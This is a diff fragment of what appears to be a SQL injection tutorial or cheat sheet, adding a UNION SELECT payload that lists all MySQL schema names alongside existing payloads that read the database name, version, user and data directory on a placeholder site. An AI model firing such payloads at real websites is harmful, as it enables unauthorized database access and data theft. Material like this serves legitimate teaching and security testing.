@@ -66,6 +66,7 @@ provides access to database metadata, information about the MySQL server such as
 
 ```
 https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT database()),4,5-- -
+https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),4,5-- -
 https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT version()),4,5-- -
 https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT user()),4,5-- -
 https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT @@datadir),4,5-- -
